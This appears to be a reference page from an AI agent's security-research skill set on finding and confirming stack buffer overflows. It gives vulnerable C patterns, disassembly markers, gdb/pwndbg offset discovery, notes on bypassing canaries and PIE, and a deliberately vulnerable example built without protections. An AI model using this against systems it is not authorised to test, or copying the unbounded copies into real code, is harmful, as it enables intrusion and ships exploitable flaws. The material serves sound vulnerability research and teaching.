# Stack buffer overflow

## (a) Source pattern

A fixed-size stack buffer written with a length the attacker controls or
no length at all:

```c
void handle(const char *input) {
    char buf[64];
    strcpy(buf, input);            // no bound
    // also: gets(buf); sprintf(buf, "%s", input); scanf("%s", buf);
    // memcpy(buf, input, input_len); read(fd, buf, 4096);
}
```

Variants: `strcat` onto a nearly-full buffer; `sprintf` with `%s` expanding
attacker data; `read()` with the *buffer page size* instead of the buffer
size; alloca with attacker length.

## (b) Binary / disassembly signature

objdump (`objdump -d -M intel ./target`):

```
sub    rsp,0x50               ; 0x50-byte frame -> ~64-byte buffer
lea    rax,[rbp-0x50]         ; dest = stack buffer
mov    rsi,rbx                ; src = attacker data
mov    rdi,rax
call   401040 <strcpy@plt>    ; no length argument at all
```

Markers:

- A copy/format import with no bound (`gets`, `strcpy`, `sprintf`,
  `scanf@plt` with a `%s` format in .rodata) targeting an `[rbp-X]` /
  `[rsp+X]` address. `rabin2 -i ./target | grep -E 'gets|strcpy|sprintf|scanf'`
  is the 10-second scan.
- Bounded functions with the wrong bound: `memcpy`/`read` where `rdx`
  traces back to input bytes, not to the frame size.
- **Canary check**: prologue `mov rax, fs:0x28; mov [rbp-8], rax` and
  epilogue `call __stack_chk_fail` → canary present. Absent → straight RIP
  control. `checksec` (pwntools) reports this as `Canary found/No canary`.
- Ghidra decompiler shows it plainly: `char local_58[64]; strcpy(local_58,
  param_1);`. r2: `aaa; afl; pdf @ sym.handle`, look for the same.

## (c) Dynamic confirmation

```sh
gdb ./target          # load the gdb-debugging skill; pwndbg assumed
pwndbg> cyclic 300
pwndbg> r <<< 'aaaabaaacaaadaaa...'       # or run with the file/socket input
# crash:
pwndbg> info frame                        # or: x/gx $rsp
pwndbg> cyclic -l 0x6161616c              # value in RIP (no PIE+no canary)
Found at offset 72
```

- 64-bit note: a non-canonical RIP faults on `ret` *before* loading RIP —
  look at `[rsp]` at the faulting `ret` instead of RIP itself.
- ASan build: `stack-buffer-overflow ... WRITE of size N` with the exact
  variable name and frame offsets.
- With canary: crash message `*** stack smashing detected ***` instead of
  RIP control — class confirmed, exploitation needs a leak.

## (d) Primitive and hand-off

Offset known → you control saved RIP (and saved RBP, and everything between
buffer and frame end: other locals, function pointers).

- NX on (normal): build a ROP chain — load `rop-chains`; deliver with
  `pwntools` (`cyclic_find`, `flat`, `ROP(elf)`).
- Canary: leak it first (format string in the same binary? OOB read?
  fork-server byte-by-byte brute: canary survives fork), then overflow
  past it keeping its value intact.
- PIE: leak a .text address to rebase the chain.
- Partial control only (e.g. one-byte RBP overwrite): consider the
  off-by-one playbook (`references/off-by-one.md`) — frame pivot.

## Worked micro-example

```c
// gcc -fno-stack-protector -no-pie -o vuln vuln.c
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv) {
    char buf[64];
    if (argc > 1) strcpy(buf, argv[1]);
    printf("hi %s\n", buf);
}
```

`./vuln $(python3 -c 'print("A"*100)')` → SIGSEGV; cyclic gives offset 72
(64 buffer + 8 saved RBP); `[rsp]` at crash = bytes 72..79 → saved RIP.
Hand `offset=72` to `rop-chains`.
